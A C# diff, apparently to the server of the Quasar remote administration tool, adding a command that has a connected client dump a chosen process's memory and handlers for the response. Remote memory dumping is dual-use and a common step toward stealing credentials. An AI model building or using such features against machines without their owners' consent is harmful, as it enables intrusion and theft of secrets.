@@ -5,6 +5,9 @@ using Quasar.Common.Messages.other;
 using Quasar.Common.Models;
 using Quasar.Common.Networking;
 using Quasar.Server.Networking;
+using Quasar.Server.Models;
+using System.Windows.Forms;
+using Quasar.Server.Forms;
 
 namespace Quasar.Server.Messages
 {
@@ -29,6 +32,10 @@ namespace Quasar.Server.Messages
         /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
         /// </remarks>
         public event ProcessActionPerformedEventHandler ProcessActionPerformed;
+
+        public delegate void OnResponseReceivedEventHandler(object sender, DoProcessDumpResponse response);
+
+        public event OnResponseReceivedEventHandler OnResponseReceived;
 
         /// <summary>
         /// Reports the result of a started process.
@@ -59,7 +66,8 @@ namespace Quasar.Server.Messages
         }
 
         public override bool CanExecute(IMessage message) => message is DoProcessResponse ||
-                                                             message is GetProcessesResponse;
+                                                             message is GetProcessesResponse ||
+                                                             message is DoProcessDumpResponse;
 
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
 
@@ -71,6 +79,9 @@ namespace Quasar.Server.Messages
                     Execute(sender, execResp);
                     break;
                 case GetProcessesResponse procResp:
+                    Execute(sender, procResp);
+                    break;
+                case DoProcessDumpResponse procResp:
                     Execute(sender, procResp);
                     break;
             }
@@ -113,6 +124,15 @@ namespace Quasar.Server.Messages
             _client.Send(new DoProcessEnd { Pid = pid });
         }
 
+        /// <summary>
+        /// Dumps a running processes memory.
+        /// </summary>
+        /// <param name="pid">The process id to dump.</param>
+        public void DumpProcess(int pid)
+        {
+            _client.Send(new DoProcessDump { Pid = pid });
+        }
+
         private void Execute(ISender client, DoProcessResponse message)
         {
             OnProcessActionPerformed(message.Action, message.Result);
@@ -121,6 +141,11 @@ namespace Quasar.Server.Messages
         private void Execute(ISender client, GetProcessesResponse message)
         {
             OnReport(message.Processes);
+        }
+
+        private void Execute(ISender client, DoProcessDumpResponse message)
+        {
+            OnResponseReceived?.Invoke(this, message);
         }
     }
 }
